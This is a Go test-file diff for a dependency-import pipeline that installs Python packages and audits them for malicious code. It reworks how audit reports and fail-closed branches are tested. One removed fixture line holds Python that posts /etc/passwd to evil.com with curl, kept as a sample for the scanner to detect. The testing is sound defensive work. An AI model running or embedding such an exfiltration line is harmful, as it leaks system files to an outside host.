@@ -127,12 +127,12 @@ func TestImportDepsSuccessReleasesTaskSlot(t *testing.T) {
 
 // TestProcessImportedDepsInstallsAndRecords drives the pipeline against a stub installer: the
 // decrypted plaintext archive is validated, "installed" into DEPS_DIR/<sm3>, the state fields
-// are set, and the audit marker reaches disk.
+// are set, and exactly one combined audit is reported under the dependency scope.
 //
 // Security.ScanEnabled=true makes the pipeline run the real audit (the fixture's regex baseline
 // engine, no LLM) over the stub's empty target directory, which passes it. That is deliberate:
-// the marker is only ever earned by an audit that ran and passed, so asserting it here would be
-// vacuous with scanning off.
+// with scanning off no audit runs and no reportAudit is emitted at all, so the report assertion
+// would be vacuous.
 func TestProcessImportedDepsInstallsAndRecords(t *testing.T) {
 	state, _ := setupTestState(t)
 	state.Security.ScanEnabled = true
@@ -147,6 +147,7 @@ func TestProcessImportedDepsInstallsAndRecords(t *testing.T) {
 	}
 
 	archive := buildTestDepsArchive(t)
+	received := captureCombinedAuditReports(t, state)
 
 	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-d", TaskID: "task-d"}
 	state.processImportedDeps(req, 1, archive)
@@ -157,18 +158,29 @@ func TestProcessImportedDepsInstallsAndRecords(t *testing.T) {
 	if installedTarget != state.currentDepsDir() {
 		t.Fatalf("install target = %q, want %q", installedTarget, state.currentDepsDir())
 	}
-	if _, err := os.Stat(filepath.Join(installedTarget, depsAuditMarker)); err != nil {
-		t.Fatalf("audit marker missing: %v", err)
+
+	rr := waitForCombinedAuditReport(t, received)
+	if rr.Scope != "deps" {
+		t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
 	}
+	if rr.Code != 0 {
+		t.Fatalf("code = %d, want 0 for a clean delivery", rr.Code)
+	}
+	// One audit, one report: a second callback would be in flight rather than counted yet,
+	// so waiting is the assertion.
+	requireNoCombinedAuditReport(t, received)
 }
 
-// TestProcessImportedDepsSkipsWhenAlreadyAudited verifies idempotency: when the same hash is
-// already marked, the installer must not be called again.
+// TestProcessImportedDepsReauditsOnRedelivery pins the deliberate absence of idempotency:
+// re-delivering the same archive re-installs it and emits a second scope="deps" report.
 //
-// Scanning is on so the first run earns the marker through the real audit rather than through
-// the skip path, which no longer writes one. The reuse this test asserts is therefore the reuse
-// the idempotence check is meant to grant: an audited directory, not merely a present one.
-func TestProcessImportedDepsSkipsWhenAlreadyAudited(t *testing.T) {
+// The short-circuit this replaces keyed on a marker recording only the dependency side's hash,
+// but the audit verdict now also depends on the model code the set is scanned together with,
+// and a content address does not capture that. No stored artifact can stand in for a verdict,
+// so the same archive is judged again on every delivery.
+//
+// Scanning is on so both runs earn their report through the real audit.
+func TestProcessImportedDepsReauditsOnRedelivery(t *testing.T) {
 	state, _ := setupTestState(t)
 	state.Security.ScanEnabled = true
 
@@ -181,29 +193,40 @@ func TestProcessImportedDepsSkipsWhenAlreadyAudited(t *testing.T) {
 		return os.MkdirAll(target, 0o755)
 	}
 
+	// Two archives with identical content: the first is removed by the pipeline as it runs, so
+	// the re-delivery needs a file of its own. Same content means the same SM3 and therefore
+	// the same directory, which is exactly what used to short-circuit.
 	archive := buildTestDepsArchive(t)
 	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-i", TaskID: "task-i"}
+	received := captureCombinedAuditReports(t, state)
 
 	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
-	state.clearDepsState()
 	state.processImportedDeps(req, 1, archive)
 
-	if calls != 1 {
-		t.Fatalf("installer called %d times, want 1 (second run must reuse the audited dir)", calls)
+	if calls != 2 {
+		t.Fatalf("installer called %d times, want 2 (every delivery re-installs)", calls)
 	}
+	for i := 1; i <= 2; i++ {
+		rr := waitForCombinedAuditReport(t, received)
+		if rr.Scope != "deps" {
+			t.Fatalf("report %d scope = %q, want \"deps\"", i, rr.Scope)
+		}
+		if rr.Code != 0 {
+			t.Fatalf("report %d code = %d, want 0", i, rr.Code)
+		}
+	}
+	requireNoCombinedAuditReport(t, received)
 }
 
-// TestProcessImportedDepsScanDisabledWritesNoMarker is the regression test for what the audit
-// marker means: it is written if and only if an audit actually ran and passed. With scanning off
-// the pipeline skips the audit, so the dependency set must leave no marker behind.
+// TestProcessImportedDepsScanDisabledSkipsAuditAndClearsNothing pins the ScanEnabled=false
+// short-circuit as the pipeline sees it: the set binds, no reportAudit is emitted, and the
+// installed directory is left on disk. An audit that never ran implicates no root, so the
+// caller's !TriggerClean gate must not fire and nothing may be cleared.
 //
-// The consequence it guards is not merely a stale file. The directory is content-addressed and
-// permanent and the idempotence check believes a matching marker forever, so a marker minted by
-// a skip would keep a never-audited set reported as audited even after the operator turns
-// scanning back on. The re-delivery below is that scenario's observable half: with the same
-// archive, and therefore the same directory, only a marker could make the second run reuse it,
-// so it must reach the installer again.
-func TestProcessImportedDepsScanDisabledWritesNoMarker(t *testing.T) {
+// The re-delivery afterwards is what shows no reuse survives: the directory exists and is bound,
+// yet an identical archive still reaches the installer, because no stored verdict can stand for
+// the audit.
+func TestProcessImportedDepsScanDisabledSkipsAuditAndClearsNothing(t *testing.T) {
 	state, _ := setupTestState(t)
 	state.Security.ScanEnabled = false
 
@@ -217,26 +240,32 @@ func TestProcessImportedDepsScanDisabledWritesNoMarker(t *testing.T) {
 	}
 
 	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-s", TaskID: "task-s"}
+	received := captureCombinedAuditReports(t, state)
+
 	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
 
 	if !state.DepsImported {
 		t.Fatal("DepsImported = false after a successful scan-disabled pipeline run")
 	}
-	if auditMarkerExists(state.currentDepsDir()) {
-		t.Fatalf("a skipped audit left an audit marker in %s: the set would be reported as audited forever",
-			state.currentDepsDir())
+	if _, err := os.Stat(state.currentDepsDir()); err != nil {
+		t.Fatalf("bound directory gone after a skipped audit: %v (nothing must be cleared)", err)
 	}
+	requireNoCombinedAuditReport(t, received)
 
 	// Turn scanning back on and re-deliver the same content. The hash is unchanged, so only a
-	// marker could short-circuit this run.
+	// stored verdict could short-circuit this run; none exists.
 	state.Security.ScanEnabled = true
 	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
 
 	if calls != 2 {
-		t.Fatalf("installer called %d times, want 2: a set that was never audited must not be reused", calls)
+		t.Fatalf("installer called %d times, want 2: a skipped audit must not short-circuit a later delivery", calls)
 	}
-	if !auditMarkerExists(state.currentDepsDir()) {
-		t.Fatal("the re-delivered set passed a real audit but carries no marker")
+	rr := waitForCombinedAuditReport(t, received)
+	if rr.Scope != "deps" {
+		t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
+	}
+	if rr.Code != 0 {
+		t.Fatalf("code = %d, want 0 for the re-delivered set's real audit", rr.Code)
 	}
 }
 
@@ -307,8 +336,8 @@ func TestProcessImportedDepsRejectsZipSlip(t *testing.T) {
 // correction 2 stresses most: a newcomer whose install fails must not unseat the dependency set
 // that is already bound and working.
 //
-// Scanning is on, and the stub installs an empty target, so the first import passes the real
-// audit and earns its marker: only then does "the bound directory kept its marker" say anything.
+// Scanning is on so the first import binds through the real combined audit and saveDepsSuccess --
+// the path production takes -- rather than through a state write the test performs itself.
 func TestProcessImportedDepsInstallFailureKeepsWorkingBinding(t *testing.T) {
 	state, _ := setupTestState(t)
 	state.Security.ScanEnabled = true
@@ -332,9 +361,10 @@ func TestProcessImportedDepsInstallFailureKeepsWorkingBinding(t *testing.T) {
 		}
 		return errors.New("pip exploded")
 	}
-	// The second archive must differ byte-for-byte from the first: an identical one hashes to
-	// the same SM3 and therefore the same directory, and the idempotence check would short
-	// circuit before the install branch this test exists to cover.
+	// The second archive must differ from the first: an identical one hashes to the same SM3 and
+	// therefore the same directory, so the "newcomer" would be the bound directory itself, and
+	// clearing its binding would be the correct behaviour rather than the unseating this test
+	// forbids.
 	other := buildTestArchive(t, map[string]string{
 		"requirements.txt":            "torch\n",
 		"second-1.0-py3-none-any.whl": "y",
@@ -344,9 +374,6 @@ func TestProcessImportedDepsInstallFailureKeepsWorkingBinding(t *testing.T) {
 	if !state.DepsImported || state.DepsHash != boundHash {
 		t.Fatalf("binding changed after a failed newcomer: DepsImported=%v DepsHash=%q want %q",
 			state.DepsImported, state.DepsHash, boundHash)
-	}
-	if _, err := os.Stat(filepath.Join(boundDir, depsAuditMarker)); err != nil {
-		t.Fatalf("bound directory lost its audit marker: %v", err)
 	}
 	assertDepsRootContainsOnly(t, state, filepath.Base(boundDir))
 }
@@ -398,14 +425,13 @@ func TestProcessImportedDepsKeepsBindingWhenNewAuditFails(t *testing.T) {
 }
 
 // TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone covers the mirror
-// case. Deleting the marker makes the idempotence check miss, so the pipeline re-runs over the
-// directory that is currently bound, destroys it, and then fails to rebuild it. The binding
-// must not survive its own directory -- a bit pointing at a missing directory is the same
-// silent degradation with the two halves swapped.
+// case. The pipeline clears the directory of the set it is about to rebuild, and re-delivering
+// the currently bound set is exactly that -- there is no idempotency short-circuit to stop it.
+// A rebuild that then fails leaves the binding pointing at a directory that no longer exists;
+// the binding must not survive its own directory, so it is cleared with it.
 //
-// Scanning is on so the first import earns a real marker for the pipeline to remove: with
-// scanning off the directory would never carry one, the removal below would fail, and the
-// idempotence check would miss for a reason other than the one this test is about.
+// Scanning is on so the first import binds through the real audit rather than through a state
+// write the test performs itself.
 func TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone(t *testing.T) {
 	state, _ := setupTestState(t)
 	state.Security.ScanEnabled = true
@@ -420,15 +446,15 @@ func TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone(t 
 		t.Fatal("first import did not bind; the rest of this test would be vacuous")
 	}
 
-	if err := os.Remove(filepath.Join(state.currentDepsDir(), depsAuditMarker)); err != nil {
-		t.Fatalf("remove audit marker: %v", err)
-	}
 	depsInstallFunc = func(wheelhouse, target string) error {
 		if err := os.MkdirAll(target, 0o755); err != nil {
 			return err
 		}
 		return errors.New("pip exploded")
 	}
+	// The re-delivered archive carries the same content, so it addresses the bound directory
+	// itself. Nothing is deleted by hand here: clearing the bound directory and then failing to
+	// rebuild it is what this pipeline does on its own now.
 	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
 
 	if state.DepsImported || state.DepsHash != "" {
@@ -520,161 +546,51 @@ func TestProcessImportedDepsReportsFailureCodeToPlatform(t *testing.T) {
 	}
 }
 
-// TestAuditMarkerVersionGate pins the content of the audit marker: only the current policy
-// version is trusted, so a marker written by another policy (or by hand) cannot short-circuit
-// the pipeline.
-func TestAuditMarkerVersionGate(t *testing.T) {
-	dir := t.TempDir()
-	if auditMarkerExists(dir) {
-		t.Fatal("absent marker must not be trusted")
-	}
-	if err := os.WriteFile(filepath.Join(dir, depsAuditMarker), []byte("audited\n"), 0o644); err != nil {
-		t.Fatal(err)
-	}
-	if auditMarkerExists(dir) {
-		t.Fatal("foreign-content marker must not be trusted")
-	}
-	if err := writeAuditMarker(dir); err != nil {
-		t.Fatal(err)
-	}
-	if !auditMarkerExists(dir) {
-		t.Fatal("fresh marker must be trusted")
-	}
-}
-
-// TestProcessImportedDepsReauditsForeignMarkerDir verifies the version gate end to end: a
-// dependency directory that carries a marker whose content is not the current policy's must be
-// rebuilt rather than reused.
+// TestRunCombinedAuditDepsTriggerFlagsTheCandidateAndRemovesNothing pins the executor's half of
+// the dependency contract: a HIGH finding under the delivered directory leaves TriggerClean false
+// and the audit as a whole failed, and the executor itself removes nothing -- clearing the
+// delivered side is the caller's job, which
+// TestProcessImportedDepsReportsFailureCodeToPlatform covers end to end.
 //
-// Security.ScanEnabled=true is what lets this test live up to its name: the first run passes a
-// real audit and earns a real marker, and the second run really does re-audit the rebuilt
-// directory. With scanning off the pipeline writes no marker at all, so the foreign string below
-// would be the only marker that ever existed and neither pass would audit anything -- the version
-// gate would still be exercised (the planted marker is foreign, and it is the content comparison
-// that makes the second run miss), but the test would no longer be re-auditing anything.
-func TestProcessImportedDepsReauditsForeignMarkerDir(t *testing.T) {
+// It drives the real engine (the regex baseline setupTestState installs) exactly as the model
+// tests do, so the assertion covers the engine call, the JSON projection and the scope=deps
+// report as one unit.
+func TestRunCombinedAuditDepsTriggerFlagsTheCandidateAndRemovesNothing(t *testing.T) {
 	state, _ := setupTestState(t)
+	// runCombinedAudit reads ScanEnabled itself (unlike the runDepsAudit it replaces, whose gate
+	// lived in its caller), so it must be on for the audit to run at all.
 	state.Security.ScanEnabled = true
-
-	origInstall := depsInstallFunc
-	t.Cleanup(func() { depsInstallFunc = origInstall })
-
-	calls := 0
-	depsInstallFunc = func(wheelhouse, target string) error {
-		calls++
-		return os.MkdirAll(target, 0o755)
-	}
-
-	req := depsImportRequest{ResourceURL: "http://x/a.tar.gz", RequestID: "req-f", TaskID: "task-f"}
-	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
-	if calls != 1 {
-		t.Fatalf("setup: installer calls=%d, want 1", calls)
-	}
-	if err := os.WriteFile(filepath.Join(state.currentDepsDir(), depsAuditMarker), []byte("audited\n"), 0o644); err != nil {
-		t.Fatal(err)
-	}
-	// The archive must be rebuilt: processImportedDeps removes the ciphertext path it is given,
-	// so reusing the same file would fail before reaching the installer.
-	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
-
-	if calls != 2 {
-		t.Fatalf("installer called %d times, want 2: a foreign marker must not short-circuit", calls)
-	}
-}
-
-// TestRunDepsAuditRemovesDirOnFailure pins the fail-closed cleanup and the scope=deps report
-// together. It drives the real engine (the regex baseline setupTestState installs) exactly as
-// TestAuditAndReportModelImportStaticFail does for the model path, so the assertion covers the
-// engine call, the JSON projection and the report as one unit. It asserts nothing about the
-// binding: that is rollbackDepsImport's job and is covered by the pipeline tests.
-func TestRunDepsAuditRemovesDirOnFailure(t *testing.T) {
-	state, _ := setupTestState(t)
-	// No ScanEnabled here: the scanning gate lives in the caller, auditAndReportDeps
-	// (deps_import.go), and this test calls runDepsAudit directly, which never reads it.
 	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
-
-	received := make(chan struct {
-		Code  int    `json:"code"`
-		Scope string `json:"scope"`
-	}, 1)
-	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Path != reportAuditEndpoint {
-			return
-		}
-		var rr struct {
-			Code  int    `json:"code"`
-			Scope string `json:"scope"`
-		}
-		_ = json.NewDecoder(r.Body).Decode(&rr)
-		received <- rr
-		w.WriteHeader(http.StatusOK)
-	}))
-	defer platform.Close()
-	state.mu.Lock()
-	state.PlatformIP, state.DockerID = platform.URL, "docker-test"
-	state.mu.Unlock()
 
 	depsDir := filepath.Join(state.Security.GetDepsDir(), "evilhash")
 	if err := os.MkdirAll(depsDir, 0o755); err != nil {
 		t.Fatalf("seed dir: %v", err)
 	}
-	code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
-	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte(code), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte(ruleMatchingPython), 0o644); err != nil {
 		t.Fatalf("seed file: %v", err)
 	}
+	received := captureCombinedAuditReports(t, state)
 
-	if passed := state.runDepsAudit(depsImportRequest{RequestID: "req-1", TaskID: "task-1"}, depsDir); passed {
-		t.Fatal("runDepsAudit returned true for a failing audit")
+	result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-1", TaskID: "task-1"}, codeAuditTriggerDeps, depsDir)
+
+	if result.Passed {
+		t.Fatal("Passed = true for an audit the delivered directory fails")
 	}
-	if _, err := os.Stat(depsDir); !os.IsNotExist(err) {
-		t.Fatalf("deps dir still present after a failed audit: %v", err)
+	if result.TriggerClean {
+		t.Fatal("TriggerClean = true for a triggering root holding the finding")
+	}
+	if _, err := os.Stat(depsDir); err != nil {
+		t.Fatalf("the executor removed the delivered directory: %v (clearing is the caller's job)", err)
 	}
 
-	select {
-	case rr := <-received:
-		if rr.Code != 1 {
-			t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
-		}
-		if rr.Scope != "deps" {
-			t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
-		}
-	case <-time.After(5 * time.Second):
-		t.Fatal("timed out waiting for the scope=deps audit report")
+	rr := waitForCombinedAuditReport(t, received)
+	if rr.Code != 1 {
+		t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
 	}
-}
-
-// auditReportCapture is the projection the two branch tests below assert on: the audit report's
-// code and scope. Those two fields are what tell a fail-closed rejection (code=2, scope=deps)
-// apart from an ordinary audit verdict, so both are read from the wire rather than from state.
-type auditReportCapture struct {
-	Code  int    `json:"code"`
-	Scope string `json:"scope"`
-}
-
-// captureAuditReport points state at a platform stub that captures the code and scope of every
-// /v1/taa/reportAudit request and returns the channel they arrive on. Any other path is answered
-// normally and dropped, so the scope=deps report the caller asserts on holds the single channel
-// slot. PlatformIP and DockerID are written under the lock because reportAuditScopedAsync reads
-// them under the same lock.
-func captureAuditReport(t *testing.T, state *TAAState) <-chan auditReportCapture {
-	t.Helper()
-	received := make(chan auditReportCapture, 1)
-	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Path != reportAuditEndpoint {
-			w.WriteHeader(http.StatusOK)
-			return
-		}
-		var rr auditReportCapture
-		_ = json.NewDecoder(r.Body).Decode(&rr)
-		received <- rr
-		w.WriteHeader(http.StatusOK)
-	}))
-	t.Cleanup(platform.Close)
-
-	state.mu.Lock()
-	state.PlatformIP, state.DockerID = platform.URL, "docker-test"
-	state.mu.Unlock()
-	return received
+	if rr.Scope != "deps" {
+		t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
+	}
+	requireNoCombinedAuditReport(t, received)
 }
 
 // seedCleanDepsDir creates DEPS_DIR/<name> holding one source file that matches no rule of the
@@ -682,31 +598,34 @@ func captureAuditReport(t *testing.T, state *TAAState) <-chan auditReportCapture
 //
 // The content is deliberately inert. A rule-matching file would weaken both branch tests below:
 // a mutation that stopped the branch under test from rejecting the set would still let the
-// ordinary audit-failure path delete the directory, so the "directory removed" assertion would
-// hold for the wrong reason instead of pinning that branch. With clean content, removal plus
-// code=2 are observable only if the branch under test actually ran.
+// ordinary audit-failure path implicate the delivered side, so the assertion would hold for the
+// wrong reason instead of pinning that branch. With clean content, TriggerClean=false plus code=2
+// are observable only if the branch under test actually ran.
 func seedCleanDepsDir(t *testing.T, state *TAAState, name string) string {
 	t.Helper()
 	depsDir := filepath.Join(state.Security.GetDepsDir(), name)
 	if err := os.MkdirAll(depsDir, 0o755); err != nil {
 		t.Fatalf("seed dir: %v", err)
 	}
-	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte("import os\n"), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte(benignPython), 0o644); err != nil {
 		t.Fatalf("seed file: %v", err)
 	}
 	return depsDir
 }
 
-// TestRunDepsAuditLLMUnavailableFailsClosed pins the LLM-unavailable branch of runDepsAudit
-// (deps_audit.go): with the LLM enabled and fail-closed, an unreachable service must reject the
-// dependency set outright rather than silently degrading to a static-only scan that lets it
-// through, and the rejection must carry code=2 with scope=deps.
+// TestRunCombinedAuditLLMUnavailableFailsClosed pins the LLM-unavailable branch of
+// runCombinedAudit (combined_audit.go): with the LLM enabled and fail-closed, an unreachable
+// service must leave the delivered side implicated -- the fail-closed direction -- rather than
+// silently degrading to a static-only scan that lets it through, and the report must carry code=2
+// with scope=deps.
 //
 // The branch is decided before GenerateAuditReport is reached, so the engine is left at the
 // fixture default on purpose: it cannot influence this outcome, and setting it would only suggest
 // it could.
-func TestRunDepsAuditLLMUnavailableFailsClosed(t *testing.T) {
+func TestRunCombinedAuditLLMUnavailableFailsClosed(t *testing.T) {
 	state, _ := setupTestState(t)
+	// runCombinedAudit reads ScanEnabled itself, so it must be on for the probe to be reached.
+	state.Security.ScanEnabled = true
 
 	// A server closed before use refuses connections immediately, so the fail-closed health probe
 	// returns without waiting out its budget.
@@ -720,63 +639,63 @@ func TestRunDepsAuditLLMUnavailableFailsClosed(t *testing.T) {
 	}
 
 	depsDir := seedCleanDepsDir(t, state, "llm-unavailable")
-	received := captureAuditReport(t, state)
+	received := captureCombinedAuditReports(t, state)
 
-	if passed := state.runDepsAudit(depsImportRequest{RequestID: "req-llm", TaskID: "task-llm"}, depsDir); passed {
-		t.Fatal("runDepsAudit returned true while the LLM was unavailable and fail-closed")
+	result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-llm", TaskID: "task-llm"}, codeAuditTriggerDeps, depsDir)
+
+	if result.TriggerClean {
+		t.Fatal("TriggerClean = true while the LLM was unavailable and fail-closed")
 	}
-	if _, err := os.Stat(depsDir); !os.IsNotExist(err) {
-		t.Fatalf("deps dir still present after a fail-closed LLM unavailability: %v", err)
+	if _, err := os.Stat(depsDir); err != nil {
+		t.Fatalf("the executor removed the delivered directory: %v (clearing is the caller's job)", err)
 	}
 
-	select {
-	case rr := <-received:
-		if rr.Code != 2 {
-			t.Fatalf("code = %d, want 2 (LLM unavailable, fail-closed)", rr.Code)
-		}
-		if rr.Scope != "deps" {
-			t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
-		}
-	case <-time.After(5 * time.Second):
-		t.Fatal("timed out waiting for the scope=deps audit report (LLM-unavailable branch)")
+	rr := waitForCombinedAuditReport(t, received)
+	if rr.Code != 2 {
+		t.Fatalf("code = %d, want 2 (LLM unavailable, fail-closed)", rr.Code)
 	}
+	if rr.Scope != "deps" {
+		t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
+	}
+	requireNoCombinedAuditReport(t, received)
 }
 
-// TestRunDepsAuditEngineErrorFailsClosed pins the engine-error branch of runDepsAudit
-// (deps_audit.go): a nil engine is a configuration the audit refuses, and that refusal must be
-// cleaned up and reported exactly like an LLM failure -- code=2 with scope=deps.
+// TestRunCombinedAuditEngineErrorFailsClosed pins the engine-error branch of runCombinedAudit
+// (combined_audit.go): a nil engine is a configuration the audit refuses, and that refusal must
+// implicate the delivered side and be reported exactly like an LLM failure -- code=2 with
+// scope=deps.
 //
 // GenerateAuditReport returns "static engine is not configured" for a nil engine rather than
 // dereferencing it (internal/codeaudit/verifier.go), so this reaches the error branch instead of
 // panicking.
-func TestRunDepsAuditEngineErrorFailsClosed(t *testing.T) {
+func TestRunCombinedAuditEngineErrorFailsClosed(t *testing.T) {
 	state, _ := setupTestState(t)
+	state.Security.ScanEnabled = true
 	// Keep the LLM out of the way: with it disabled the engine is the only thing left that can
 	// fail, which is what makes this test drive the engine-error branch rather than the one above.
 	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
 	state.Security.Engine = nil
 
 	depsDir := seedCleanDepsDir(t, state, "engine-missing")
-	received := captureAuditReport(t, state)
+	received := captureCombinedAuditReports(t, state)
 
-	if passed := state.runDepsAudit(depsImportRequest{RequestID: "req-eng", TaskID: "task-eng"}, depsDir); passed {
-		t.Fatal("runDepsAudit returned true with no static engine configured")
+	result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-eng", TaskID: "task-eng"}, codeAuditTriggerDeps, depsDir)
+
+	if result.TriggerClean {
+		t.Fatal("TriggerClean = true with no static engine configured")
 	}
-	if _, err := os.Stat(depsDir); !os.IsNotExist(err) {
-		t.Fatalf("deps dir still present after a missing-engine audit failure: %v", err)
+	if _, err := os.Stat(depsDir); err != nil {
+		t.Fatalf("the executor removed the delivered directory: %v (clearing is the caller's job)", err)
 	}
 
-	select {
-	case rr := <-received:
-		if rr.Code != 2 {
-			t.Fatalf("code = %d, want 2 (engine error, fail-closed)", rr.Code)
-		}
-		if rr.Scope != "deps" {
-			t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
-		}
-	case <-time.After(5 * time.Second):
-		t.Fatal("timed out waiting for the scope=deps audit report (engine-error branch)")
+	rr := waitForCombinedAuditReport(t, received)
+	if rr.Code != 2 {
+		t.Fatalf("code = %d, want 2 (engine error, fail-closed)", rr.Code)
 	}
+	if rr.Scope != "deps" {
+		t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
+	}
+	requireNoCombinedAuditReport(t, received)
 }
 
 // TestStatusReportsDepsState pins the two dependency fields of the /v1/taa/status envelope:
